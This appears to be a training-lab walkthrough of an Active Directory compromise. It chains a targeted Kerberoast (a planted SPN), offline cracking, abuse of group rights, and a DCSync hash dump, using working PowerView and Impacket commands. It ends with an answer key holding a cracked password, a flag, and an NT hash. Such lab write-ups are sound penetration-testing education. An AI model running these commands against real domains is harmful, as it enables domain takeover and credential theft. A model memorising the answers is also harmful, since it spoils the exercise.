# Active Directory Compromise
## Fastest Path to Compromise
Starting credential: `mssqladm:DBAilfreight1!`

### 1. Targeted Kerberoast of ttimmons
BloodHound shows `mssqladm` has **GenericWrite** over `ttimmons`. GenericWrite lets you write arbitrary attributes — including `servicePrincipalName`. Any account with an SPN is Kerberoastable, so you plant a fake one.

Build a PSCredential so PowerView runs as mssqladm without a new RDP session:

```powershell
$SecPassword = ConvertTo-SecureString 'DBAilfreight1!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\mssqladm', $SecPassword)
```

Set the fake SPN (remove it later; note it in the report appendix):

```powershell
Set-DomainObject -credential $Cred -Identity ttimmons -SET @{serviceprincipalname='acmetesting/LEGIT'} -Verbose
```

### 2. Request and crack the TGS
The DC will now issue a service ticket for `ttimmons`, encrypted with that user's password hash.

```
proxychains GetUserSPNs.py -dc-ip 172.16.8.3 INLANEFREIGHT.LOCAL/mssqladm -request-user ttimmons
hashcat -m 13100 ttimmons_tgs /usr/share/wordlists/rockyou.txt
```

Weak password → cracks in ~22 seconds.

### 3. ttimmons → Server Admins
BloodHound: `ttimmons` has **GenericAll** over the **SERVER ADMINS** group, and that group holds `GetChanges` + `GetChangesAll` on the domain object — i.e. DCSync rights. GenericAll over a group means you can add yourself to it and inherit those rights.

```powershell
$timpass = ConvertTo-SecureString '<cracked password>' -AsPlainText -Force
$timcreds = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\ttimmons', $timpass)

$group = Convert-NameToSid "Server Admins"
Add-DomainGroupMember -Identity $group -Members 'ttimmons' -Credential $timcreds -Verbose
```

### 4. DCSync
With replication rights, impersonate a DC over DRSUAPI and pull NTDS.DIT secrets remotely — no code execution on the DC needed.

```
proxychains secretsdump.py ttimmons@172.16.8.3 -just-dc-ntlm
```

Returns every domain NTLM hash, including `Administrator` and `krbtgt`. Domain compromised — the krbtgt hash also enables Golden Tickets for persistence.

## Questions
1. Set a fake SPN on the ttimmons user. Kerberoast this user and crack the TGS ticket offline to reveal their cleartext password. Submit this password as your answer. **Answer: Repeat09**
2. After obtaining Domain Admin rights, authenticate to the domain controller and submit the contents of the flag.txt file on the Administrator Desktop. **Answer: 7c09eb1fff981654a3bb3b4a4e0d176a**
3. Compromise the INLANEFREIGHT.LOCAL domain and dump the NTDS database. Submit the NT hash of the Administrator account as your answer. **Answer: fd1f7e5564060258ea787ddbb6e6afa2**